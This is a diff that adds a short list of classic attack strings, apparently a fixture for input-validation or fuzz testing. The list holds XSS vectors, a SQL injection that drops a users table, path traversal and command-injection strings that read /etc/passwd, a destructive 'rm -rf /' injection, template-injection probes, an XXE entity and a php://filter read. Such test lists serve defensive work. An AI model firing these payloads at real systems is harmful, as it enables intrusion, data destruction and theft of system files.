@@ -1,0 +1,19 @@
+<script>alert('xss')</script>
+'); DROP TABLE users; --
+../../../etc/passwd
+javascript:alert('xss')
+<iframe src="javascript:alert('xss')">
+<svg onload=alert('xss')>
+<img src=x onerror=alert('xss')>
+'; rm -rf /; echo '
+| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+{{7*7}}
+${7*7}
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+php://filter/convert.base64-encode/resource=/etc/passwd
+data:text/html,<script>alert('xss')</script>
+vbscript:msgbox("xss")
+livescript:alert('xss')
+mocha:alert('xss')
